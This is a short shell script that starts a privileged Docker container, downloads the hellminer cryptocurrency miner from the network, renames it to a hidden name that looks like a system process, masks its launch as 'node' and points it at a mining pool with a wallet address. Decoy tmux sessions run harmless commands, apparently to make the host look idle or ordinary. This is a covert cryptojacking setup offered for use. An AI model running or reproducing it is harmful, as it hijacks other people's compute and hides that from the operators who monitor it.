docker build . -t bit
docker run -itd --name bit --cap-add=SYS_ADMIN --restart=always bit sleep infinity
docker exec -it bit bash -c "exec -a node wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz && rm -rf hellminer_linux64.tar.gz && chmod +x ./hellminer && mv hellminer .supervisord-wr && ./.supervisord-wr -c stratum+tcp://157.245.199.188:4444 -u RWsSEGpV2E6yYa3UZ8fTE17FE3ZzMWzRAs."$(TZ='Asia/Jakarta' date +"%d-%b-%Y_Jam-%H-%M")-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16)" --cpu 8"
tmux new -d -s checker-session 'tail -f /dev/null'
tmux new -d -s checkup-session 'cat'
tmux new -d -s moniting-session 'top'
tmux attach -t moniting-session
